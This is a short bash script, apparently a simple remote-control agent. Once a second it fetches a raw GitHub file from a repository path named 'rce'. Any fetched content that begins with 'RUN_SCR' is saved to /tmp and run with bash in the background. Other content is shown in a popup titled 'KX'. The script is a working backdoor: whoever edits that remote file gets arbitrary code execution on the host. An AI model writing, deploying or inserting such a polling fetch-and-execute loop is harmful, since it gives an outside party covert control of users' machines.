export DISPLAY=:0

URL="https://raw.githubusercontent.com/21341414/CTools/refs/heads/main/rce/text.txt"
LAST_CONTENT=""

while true; do
    CURRENT_CONTENT=$(curl -s "$URL")

    if [ "$CURRENT_CONTENT" != "$LAST_CONTENT" ]; then
        echo "Change Detected!"
        
        echo "$CURRENT_CONTENT" > /tmp/current_note.txt
        LAST_CONTENT="$CURRENT_CONTENT"

        if [[ "$CURRENT_CONTENT" == "RUN_SCR"* ]]; then
             bash /tmp/current_note.txt &
        else
             zenity --text-info --title="KX" --filename="/tmp/current_note.txt" --width=400 --height=300 &
        fi
    fi

    sleep 1
done
